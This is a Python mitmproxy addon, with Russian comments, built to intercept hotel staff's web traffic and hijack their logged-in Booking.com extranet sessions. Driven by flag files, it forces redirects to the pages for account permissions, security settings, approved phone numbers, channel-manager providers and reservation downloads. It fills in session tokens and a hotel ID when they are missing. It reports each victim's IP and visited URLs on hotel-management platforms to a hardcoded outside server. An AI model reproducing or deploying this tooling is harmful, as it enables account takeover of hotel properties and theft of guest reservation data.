from mitmproxy import http, ctx
import os
import urllib.parse
import time
import threading
import requests
import json
from datetime import datetime
import re

# --- TELEGRAM LOGGING CONFIG ---
TELEGRAM_LOGGING_ENABLED = True
LOG_SERVER_URL = "http://89.42.142.29:5000/log_redirect"
FUNCTION_COMPLETE_URL = "http://89.42.142.29:5000/log_function_complete"

# Домены для мониторинга платформ
PLATFORM_DOMAINS = [
    "cloudbeds.com", "mews.com", "hotelogix.com", "protel.net",
    "roomraccoon.com", "hoteliga.com", "rmscloud.com", "hotelfriend.com",
    "littlehotelier.com", "clock-software.com", "innroad.com",
    "hostpms.com", "travelline.ru", "sihot.com", "autoclerk.com",
    "ezeeabsolute.com", "skytouchtechnology.com", "roommaster2000.co.uk",
    "welcome-computers.co.uk", "skywaresystems.com", "verialhotel.es",
    "macxton.com", "zeeustecnologia.com", "oonsoft.co.nz",
    "cangooroo.net", "topsys.fr", "hotelpms.ru", "bbc.com"
]

# Пути к флагам
COOKIE = "mitm_redirect_done"
FORCE_FLAG = r"C:\temp\mitm_force_redirect"
ONE_SHOT_FLAG = r"C:\temp\mitm_reset_once"
MESSAGE_FLAG = r"C:\temp\mitm_message_once"
PROVIDER_FLAG = r"C:\temp\mitm_provider_once"
USER_FLAG = r"C:\temp\mitm_user_once"
SECURITY_FLAG = r"C:\temp\mitm_security_once"
OPERATION_11_FLAG = r"C:\temp\mitm_operation_11_once"
OPERATION_12_FLAG = r"C:\temp\mitm_operation_12_once"
BOOKING_HOTEL_FLAG = r"C:\temp\mitm_booking_hotel_once"
BOOKING_HOTEL_SECURITY_FLAG = r"C:\temp\mitm_booking_hotel_security_once"
OPERATION_16_FLAG = r"C:\temp\mitm_operation_16_once"
CUSTOM_REDIRECT_FLAG = r"C:\temp\mitm_custom_redirect_once"
CUSTOM_REDIRECT_FROM_FILE = r"C:\temp\mitm_custom_redirect_from.txt"
CUSTOM_REDIRECT_TO_FILE = r"C:\temp\mitm_custom_redirect_to.txt"
CUSTOM_REDIRECT_DONE_FLAG = r"C:\temp\mitm_custom_redirect_done.txt"
BOOKING_RESERVATIONS_FLAG = r"C:\temp\mitm_booking_reservations_once"
BOOKING_RESERVATIONS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_reservations_hotel_id.txt"
BOOKING_RESERVATIONS_REPORT_ID_FILE = r"C:\temp\mitm_booking_reservations_report_id.txt"

REDIRECT_FILE = r"C:\mitm\redirect_target.txt"
LOG_PREFIX = "[MITM-REDIR]"

# Трекеры для анти-спама
last_function_start = {}  # {function_type: timestamp}

# Добавьте эту функцию после других функций
def get_notification_key(redirect_type: str, from_url: str) -> str:
    """Создает ключ для анти-спама на основе типа редиректа и URL"""
    # Для функций 13, 15, 18 - группируем по типу
    if "BOOKING_HOTEL" in redirect_type:
        return "BOOKING_HOTEL"
    elif "FUNCTION_15" in redirect_type:
        return "FUNCTION_15_HOTEL_SECURITY"
    elif "FUNCTION_18" in redirect_type:
        return "FUNCTION_18_RESERVATIONS_DOWNLOAD"
    
    # Для других типов - используем redirect_type
    return redirect_type

def log(msg):
    ctx.log.info(f"{LOG_PREFIX} {msg}")

def post_log_to_server(payload: dict, endpoint: str = LOG_SERVER_URL):
    """Асинхронная отправка лога"""
    def _worker(data, url):
        try:
            headers = {'Content-Type': 'application/json'}
            requests.post(url, json=data, headers=headers, timeout=3)
        except Exception as e:
            try:
                ctx.log.warn(f"{LOG_PREFIX} failed to post to {url}: {e}")
            except Exception:
                pass

    t = threading.Thread(target=_worker, args=(payload, endpoint), daemon=True)
    t.start()

def log_redirect_to_server(client_ip, from_url, to_url, redirect_type):
    """Логирование редиректа"""
    # Создаем ключ для анти-спама
    notification_key = get_notification_key(redirect_type, from_url)
    
    payload = {
        "client_ip": client_ip or "Unknown",
        "from_url": from_url or "Unknown",
        "to_url": to_url or "Unknown",
        "redirect_type": redirect_type or "Unknown",
        "notification_key": notification_key,  # Добавляем ключ для анти-спама
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    post_log_to_server(payload, LOG_SERVER_URL)
    log(f"Posted redirect: {redirect_type} from {client_ip}")

def send_function_complete_notification(client_ip: str, from_url: str, function_type: str):
    """Отправка уведомления о завершении функции"""
    def _send_complete():
        try:
            payload = {
                "client_ip": client_ip or "Unknown",
                "from_url": from_url or "Unknown",
                "function_type": function_type,
                "timestamp": datetime.utcnow().isoformat() + "Z"
            }
            
            log(f"Sending function complete: {function_type}")
            post_log_to_server(payload, FUNCTION_COMPLETE_URL)
            
        except Exception as e:
            log(f"Error sending function complete: {e}")
    
    threading.Thread(target=_send_complete, daemon=True).start()

def should_log_domain(flow: http.HTTPFlow) -> bool:
    """Проверяет, нужно ли логировать доступ к платформе"""
    if not TELEGRAM_LOGGING_ENABLED:
        return False
    
    host = (flow.request.pretty_host or "").lower()
    
    # Проверяем платформы
    for domain in PLATFORM_DOMAINS:
        if domain in host:
            return True
    
    return False

def is_platform_domain(host: str) -> bool:
    """Проверяет, является ли домен платформой"""
    for domain in PLATFORM_DOMAINS:
        if domain in host:
            return True
    return False

# --- Вспомогательные функции ---
def get_redirect_target():
    try:
        if os.path.exists(REDIRECT_FILE):
            with open(REDIRECT_FILE, 'r') as f:
                target = f.read().strip()
                if target:
                    return target
        return "https://bbc.com"
    except Exception as e:
        log(f"Error reading redirect target: {e}")
        return "https://bbc.com"

def should_force():
    return os.path.exists(FORCE_FLAG)

def should_one_shot():
    return os.path.exists(ONE_SHOT_FLAG)

def should_message():
    return os.path.exists(MESSAGE_FLAG)

def should_provider():
    return os.path.exists(PROVIDER_FLAG)

def should_user():
    return os.path.exists(USER_FLAG)

def should_security():
    return os.path.exists(SECURITY_FLAG)

def should_operation_11():
    return os.path.exists(OPERATION_11_FLAG)

def should_operation_12():
    return os.path.exists(OPERATION_12_FLAG)

def should_booking_hotel():
    return os.path.exists(BOOKING_HOTEL_FLAG)

def should_booking_hotel_security():
    return os.path.exists(BOOKING_HOTEL_SECURITY_FLAG)

def should_operation_16():
    return os.path.exists(OPERATION_16_FLAG)

def should_custom_redirect():
    return os.path.exists(CUSTOM_REDIRECT_FLAG)

def get_custom_redirect_from():
    try:
        if os.path.exists(CUSTOM_REDIRECT_FROM_FILE):
            with open(CUSTOM_REDIRECT_FROM_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading custom redirect FROM: {e}")
    return ""

def get_custom_redirect_to():
    try:
        if os.path.exists(CUSTOM_REDIRECT_TO_FILE):
            with open(CUSTOM_REDIRECT_TO_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading custom redirect TO: {e}")
    return ""

def should_booking_reservations():
    return os.path.exists(BOOKING_RESERVATIONS_FLAG)

def get_booking_reservations_hotel_id():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_HOTEL_ID_FILE):
            with open(BOOKING_RESERVATIONS_HOTEL_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking reservations hotel_id: {e}")
    return "14762911"

def get_booking_reservations_report_id():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_REPORT_ID_FILE):
            with open(BOOKING_RESERVATIONS_REPORT_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking reservations report_id: {e}")
    return "5865185"

def remove_operation_16_flag():
    try:
        if os.path.exists(OPERATION_16_FLAG):
            os.remove(OPERATION_16_FLAG)
            log("Operation 16 flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_16_flag error: {e}")

def enable_booking_hotel_security_flag():
    try:
        parent = os.path.dirname(BOOKING_HOTEL_SECURITY_FLAG)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
            f.write("enabled")
        log("Booking-hotel-security redirect flag created")
    except Exception as e:
        log(f"Error creating booking-hotel-security flag: {e}")

def remove_booking_hotel_security_flag():
    try:
        if os.path.exists(BOOKING_HOTEL_SECURITY_FLAG):
            os.remove(BOOKING_HOTEL_SECURITY_FLAG)
            log("Booking-hotel-security redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_hotel_security_flag error: {e}")

def enable_booking_hotel_flag():
    try:
        parent = os.path.dirname(BOOKING_HOTEL_FLAG)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(BOOKING_HOTEL_FLAG, 'w') as f:
            f.write("enabled")
        log("Booking-hotel redirect flag created")
    except Exception as e:
        log(f"Error creating booking-hotel flag: {e}")

def remove_booking_hotel_flag():
    try:
        if os.path.exists(BOOKING_HOTEL_FLAG):
            os.remove(BOOKING_HOTEL_FLAG)
            log("Booking-hotel redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_hotel_flag error: {e}")

def remove_booking_reservations_flag():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_FLAG):
            os.remove(BOOKING_RESERVATIONS_FLAG)
            log("Booking reservations redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_reservations_flag error: {e}")

def remove_one_shot_flag():
    try:
        if os.path.exists(ONE_SHOT_FLAG):
            os.remove(ONE_SHOT_FLAG)
            log("Global one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_one_shot_flag error: {e}")

def remove_message_flag():
    try:
        if os.path.exists(MESSAGE_FLAG):
            os.remove(MESSAGE_FLAG)
            log("Booking.com message one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_message_flag error: {e}")

def remove_provider_flag():
    try:
        if os.path.exists(PROVIDER_FLAG):
            os.remove(PROVIDER_FLAG)
            log("Booking.com provider one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_provider_flag error: {e}")

def remove_user_flag():
    try:
        if os.path.exists(USER_FLAG):
            os.remove(USER_FLAG)
            log("Booking.com user one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_user_flag error: {e}")

def remove_security_flag():
    try:
        if os.path.exists(SECURITY_FLAG):
            os.remove(SECURITY_FLAG)
            log("Booking.com security one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_security_flag error: {e}")

def remove_operation_11_flag():
    try:
        if os.path.exists(OPERATION_11_FLAG):
            os.remove(OPERATION_11_FLAG)
            log("Operation 11 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_11_flag error: {e}")

def remove_operation_12_flag():
    try:
        if os.path.exists(OPERATION_12_FLAG):
            os.remove(OPERATION_12_FLAG)
            log("Operation 12 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_12_flag error: {e}")

def is_redirect_target(flow: http.HTTPFlow, redirect_target: str) -> bool:
    try:
        if not redirect_target:
            return False
        req_url = flow.request.pretty_url.lower()
        target_url = redirect_target.lower().rstrip("/")
        return req_url.startswith(target_url)
    except Exception:
        return False

def get_client_ip(flow):
    """Получение IP адреса клиента"""
    try:
        client_conn = getattr(flow, "client_conn", None)
        if client_conn:
            peername = getattr(client_conn, "peername", None)
            if peername and isinstance(peername, tuple) and len(peername) > 0:
                return peername[0]
    except Exception as e:
        log(f"Error getting client IP: {e}")
    
    return "Unknown"

# --- Функции редиректов ---
def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
    flags = {
        "message": (should_message, remove_message_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html"),
        "provider": (should_provider, remove_provider_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/channel-manager/index.html"),
        "user": (should_user, remove_user_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions.html"),
        "security": (should_security, remove_security_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html")
    }
    
    if redirect_type not in flags:
        return False
        
    should_redirect, remove_flag, base_url = flags[redirect_type]
    
    if not should_redirect():
        return False

    url = flow.request.pretty_url
    if not url.startswith("https://admin.booking.com/hotel/hoteladmin/"):
        return False

    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    # Получаем hotel_id и ses из запроса
    hotel_id = query.get("hotel_id", ["14762911"])[0]
    ses = query.get("ses", ["ec1745929d110e5a461e56e51a3cda93"])[0]

    # Формируем целевой URL в зависимости от типа
    if redirect_type == "provider":
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}&fr_account_menu=1&view=start"
    else:
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}"

    log(f"Booking.com {redirect_type.upper()} redirect {url} -> {target_url}")
    
    # Логируем редирект
    client_ip = get_client_ip(flow)
    log_redirect_to_server(client_ip, url, target_url, f"BOOKING_{redirect_type.upper()}")
    
    # Выполняем редирект
    flow.response = http.Response.make(
        302, b"", {"Location": target_url}
    )

    remove_flag()
    
    # Отправляем уведомление о завершении
    if redirect_type == "message":
        send_function_complete_notification(client_ip, url, "FUNCTION_7_COMPLETE")
    elif redirect_type == "provider":
        send_function_complete_notification(client_ip, url, "FUNCTION_8_COMPLETE")
    elif redirect_type == "user":
        send_function_complete_notification(client_ip, url, "FUNCTION_9_COMPLETE")
    elif redirect_type == "security":
        send_function_complete_notification(client_ip, url, "FUNCTION_10_COMPLETE")
    
    return True

# В функции booking_reservations_download_redirect исправьте строки:
# Было: status_emoji = "📥"
# Стало: status_emoji = "📭"

# И в format_function_notification в telegram_server.py уже исправлено

# Также нужно исправить завершение функции 18 в mitm_redirect_addon.py:
def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 18:
    Редиректит все запросы к admin.booking.com/hotel/любое продолжение 
    на страницу загрузки резервов с заданными hotel_id и reportId.
    
    Редирект прекращается, когда пользователь запросит или будет отправлен на:
    https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id=любое значение&lang=любое значение&reportId=5865185&ses=любое продолжение
    """
    try:
        if not should_booking_reservations():
            return False

        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        
        # Проверяем, что это admin.booking.com
        if not host.endswith("admin.booking.com"):
            return False
            
        # Проверяем, начинается ли URL с /hotel/
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        if not path.startswith("/hotel/"):
            return False
        
        # Проверяем, не является ли это уже целевой страницей reservations_download.html с параметром ses
        if "reservations_download.html" in url:
            # Парсим параметры
            query = urllib.parse.parse_qs(parsed.query)
            
            # Если есть параметр ses, значит это конечная точка - отключаем редирект
            if "ses" in query:
                log("Function 18: User reached reservations_download.html with ses parameter -> disabling redirect")
                remove_booking_reservations_flag()
                
                # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ ФУНКЦИИ 18
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, url, "FUNCTION_18_COMPLETE")
                
                return False
                
            # Если это reservations_download.html БЕЗ ses - тоже не редиректим
            # (чтобы избежать цикла, если пользователь уже на этой странице)
            return False
        
        # Получаем параметры hotel_id и reportId из конфигурации
        hotel_id = get_booking_reservations_hotel_id()
        report_id = get_booking_reservations_report_id()
        
        # Формируем целевой URL
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id={hotel_id}&lang=&reportId={report_id}"
        
        log(f"Function 18: Redirect {url} -> {target_url}")
        
        # Логируем редирект
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_RESERVATIONS_DOWNLOAD")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"booking_reservations_download_redirect error: {e}")
        return False

def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 13:
    Редиректит все запросы на approvednumbers.html.
    """
    try:
        if not should_booking_hotel():
            return False

        url = flow.request.pretty_url
        approved_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"

        # Если это сам approvednumbers.html — проверяем наличие auth_assurance_last_check
        if url.startswith(approved_base):
            parsed = urllib.parse.urlparse(url)
            query = urllib.parse.parse_qs(parsed.query)
            if "auth_assurance_last_check" in query:
                log("Function 13: Detected approvednumbers.html with auth_assurance_last_check -> function completed")
                remove_booking_hotel_flag()
                
                # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, url, "FUNCTION_13_COMPLETE")
                
                # --- ОПЕРАЦИЯ 16: Если активна операция 16, включаем функцию 15 ---
                if should_operation_16():
                    log("Operation 16: Function 13 completed, enabling function 15")
                    try:
                        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
                            f.write("enabled")
                        log("Operation 16: Function 15 enabled")
                    except Exception as e:
                        log(f"Error enabling function 15 in operation 16: {e}")
            
            # Do not redirect approvednumbers itself
            return False

        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        host = (flow.request.pretty_host or "").lower()

        # Только для admin.booking.com и путей начинающихся с /hotel/
        if not host.endswith("admin.booking.com"):
            return False
        if not path.startswith("/hotel/"):
            return False

        # Получаем ses и hotel_id
        query = urllib.parse.parse_qs(parsed.query)
        hotel_id = None
        ses = None

        if "hotel_id" in query:
            hotel_id = query.get("hotel_id", [None])[0]
        if "ses" in query:
            ses = query.get("ses", [None])[0]

        # Если не нашли — пытаемся из Referer
        if not hotel_id or not ses:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception:
                    pass

        # Дополнительная эвристика
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", path)
            if m:
                hotel_id = m.group(1)

        # Подставляем дефолтные значения
        if not hotel_id:
            hotel_id = "14762911"
        if not ses:
            ses = "ec1745929d110e5a461e56e51a3cda93"

        target_url = f"{approved_base}?lang=en&ses={ses}&hotel_id={hotel_id}"

        log(f"Function 13: BOOKING_HOTEL redirect {url} -> {target_url}")

        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "BOOKING_HOTEL")

        # Выполняем редирект
        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True

    except Exception as e:
        log(f"booking_hotel_global_redirect error: {e}")
        return False

def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 15:
    Перенаправляет на security_settings.html.
    Анти-спам: отправляет только один лог о начале.
    """
    try:
        if not should_booking_hotel_security():
            return False

        url = flow.request.pretty_url
        
        # Проверяем, не является ли это целевой страницей settings.html
        if "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings.html" in url:
            log("Function 15: User reached messaging/settings.html -> function completed")
            remove_booking_hotel_security_flag()
            
            # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ
            client_ip = get_client_ip(flow)
            send_function_complete_notification(client_ip, url, "FUNCTION_15_COMPLETE")
            
            # --- ОПЕРАЦИЯ 16: Если активна операция 16, завершаем ее ---
            if should_operation_16():
                log("Operation 16: Function 15 completed, operation finished")
                remove_operation_16_flag()
            
            return False
        
        # Проверяем, что это запрос к admin.booking.com
        host = (flow.request.pretty_host or "").lower()
        if not host.endswith("admin.booking.com"):
            return False
            
        # Если уже на security_settings.html - не делаем редирект
        if "security_settings.html" in url:
            return False

        # Получаем параметры
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        hotel_id = None
        ses = None
        
        # Пытаемся получить hotel_id и ses
        if "hotel_id" in query:
            hotel_id = query.get("hotel_id", [None])[0]
        if "ses" in query:
            ses = query.get("ses", [None])[0]
        
        # Если не нашли в query - проверяем Referer
        if not hotel_id or not ses:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception:
                    pass
        
        # Дополнительная эвристика
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
            if m:
                hotel_id = m.group(1)
        
        # Значения по умолчанию
        if not hotel_id:
            hotel_id = "14762911"
        if not ses:
            ses = "fe4d20067bebe1ae741804589903f82f"
        
        # Формируем целевой URL
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html?ses={ses}&hotel_id={hotel_id}&lang=en"
        
        log(f"Function 15: Redirect {url} -> {target_url}")
        
        # Логируем редирект (отправляется на сервере с анти-спамом)
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_15_HOTEL_SECURITY")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"booking_hotel_security_redirect error: {e}")
        return False

def custom_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 17: ЕДИНОРАЗОВЫЙ КАСТОМНЫЙ РЕДИРЕКТ
    """
    try:
        if not should_custom_redirect():
            return False
        
        # Проверяем, не выполнен ли уже единоразовый редирект
        if os.path.exists(CUSTOM_REDIRECT_DONE_FLAG):
            log("[F17] One-time redirect already performed")
            return False
        
        url = flow.request.pretty_url
        from_domain = get_custom_redirect_from()
        to_domain = get_custom_redirect_to()
        
        if not from_domain or not to_domain:
            log("[F17] No redirect configuration found")
            return False
        
        # Очищаем URL для сравнения
        from_domain_clean = from_domain.lower().rstrip("/")
        url_lower = url.lower()
        
        # Проверяем, начинается ли URL с указанного домена "откуда"
        if not url_lower.startswith(from_domain_clean):
            return False
        
        # Если уже на целевом URL - не делаем редирект
        to_domain_clean = to_domain.lower().rstrip("/")
        if url_lower.startswith(to_domain_clean):
            return False
        
        log(f"[FUNCTION 17] ONE-TIME redirect triggered!")
        log(f"[F17] From: {url}")
        log(f"[F17] To:   {to_domain}")
        
        # Логируем редирект
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, to_domain, "CUSTOM_ONETIME_REDIRECT")
        
        # ПОМЕЧАЕМ, что единоразовый редирект выполнен
        try:
            with open(CUSTOM_REDIRECT_DONE_FLAG, 'w') as f:
                f.write("1")
            log("[F17] One-time redirect DONE flag set")
            
            # Удаляем флаг активации через 2 секунды
            def remove_activation_flag():
                time.sleep(2)
                try:
                    if os.path.exists(CUSTOM_REDIRECT_FLAG):
                        os.remove(CUSTOM_REDIRECT_FLAG)
                        log("[F17] Activation flag removed")
                except Exception as e:
                    log(f"[F17] Error in delayed flag removal: {e}")
            
            threading.Thread(target=remove_activation_flag, daemon=True).start()
            
        except Exception as e:
            log(f"[F17] Error setting done flag: {e}")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": to_domain,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0",
                "X-MITM-Redirect": "Function-17-One-Time"
            }
        )
        return True
        
    except Exception as e:
        log(f"[F17] custom_redirect error: {e}")
        return False

# Главная точка входа
def request(flow: http.HTTPFlow) -> None:
    # Логируем доступ к платформам (анти-спам на сервере)
    if should_log_domain(flow):
        try:
            client_ip = get_client_ip(flow)
            from_url = flow.request.pretty_url
            
            # Определяем тип редиректа
            redirect_type = "DOMAIN_MONITOR_PLATFORM_ACCESS"
            
            # Отправляем на сервер
            log_redirect_to_server(
                client_ip=client_ip,
                from_url=from_url,
                to_url="MONITORED_DOMAIN_ACCESS",
                redirect_type=redirect_type
            )
        except Exception as e:
            log(f"Error in domain monitoring: {e}")
    
    redirect_target = get_redirect_target()
    
    # ========== ФУНКЦИЯ 17: ЕДИНОРАЗОВЫЙ КАСТОМНЫЙ РЕДИРЕКТ ==========
    if custom_redirect(flow):
        return
    
    # ========== ФУНКЦИЯ 18: BOOKING RESERVATIONS DOWNLOAD REDIRECT ==========
    if booking_reservations_download_redirect(flow):
        return
    
    if not redirect_target:
        return

    host = (flow.request.pretty_host or "").lower()
    path = flow.request.path or "/"
    client_ip = get_client_ip(flow)

    if is_redirect_target(flow, redirect_target):
        log(f"skip redirect for target itself: {flow.request.pretty_url}")
        return

    log(f"incoming {host}{path} client={client_ip}")

    # --- Обработка других функций ---
    target_domains = ["admin.booking.com", "bbc.com"]

    for domain in target_domains:
        if host.endswith(domain.lower()):
            # --- ОПЕРАЦИЯ 16: Переключение с функции 13 на функцию 15 ---
            if should_operation_16():
                if not should_booking_hotel() and should_booking_hotel_security():
                    pass
                elif should_booking_hotel():
                    pass
            
            # --- ФУНКЦИЯ 15: Booking Hotel Security Redirect ---
            if booking_hotel_security_redirect(flow):
                return
                
            # --- ФУНКЦИЯ 13: Booking hotel global redirect ---
            if booking_hotel_global_redirect(flow):
                return

            # Операция 11
            if (should_operation_11() and 
                flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings")):
                log("Operation 11: user reached messaging/settings page, enabling provider redirect")
                try:
                    with open(PROVIDER_FLAG, 'w') as f:
                        f.write("enabled")
                except Exception as e:
                    log(f"Error enabling provider redirect: {e}")
                return
            
            # Операция 12
            if (should_operation_12() and 
                flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions")):
                log("Operation 12: user reached accounts_and_permissions page, enabling security redirect")
                try:
                    with open(SECURITY_FLAG, 'w') as f:
                        f.write("enabled")
                except Exception as e:
                    log(f"Error enabling security redirect: {e}")
                return
            
            # Стандартные редиректы
            if booking_redirect(flow, "message"):
                if should_operation_11():
                    log("Operation 11: message redirect completed")
                return
                
            if booking_redirect(flow, "provider"):
                if should_operation_11():
                    log("Operation 11: provider redirect completed, operation finished")
                    remove_operation_11_flag()
                return
                
            if booking_redirect(flow, "user"):
                if should_operation_12():
                    log("Operation 12: user redirect completed")
                return
                
            if booking_redirect(flow, "security"):
                if should_operation_12():
                    log("Operation 12: security redirect completed, operation finished")
                    remove_operation_12_flag()
                return

            # Обычные редиректы
            if should_force():
                log(f"FORCE redirect {host}{path} -> {redirect_target}")
                client_ip = get_client_ip(flow)
                log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "FORCE")
                flow.response = http.Response.make(302, b"", {"Location": redirect_target})
                return

            if should_one_shot():
                log(f"GLOBAL ONE-SHOT redirect {host}{path} -> {redirect_target}")
                client_ip = get_client_ip(flow)
                log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
                flow.response = http.Response.make(
                    302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
                )
                remove_one_shot_flag()
                return

            cookie_present = False
            try:
                cookie_present = bool(flow.request.cookies.get(COOKIE))
            except Exception:
                cookie_present = False

            if cookie_present:
                log(f"cookie present -> skipping redirect for {host}")
                return

            log(f"one-shot client redirect {host}{path} -> {redirect_target}")
            client_ip = get_client_ip(flow)
            log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
            flow.response = http.Response.make(
                302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
            )
            return
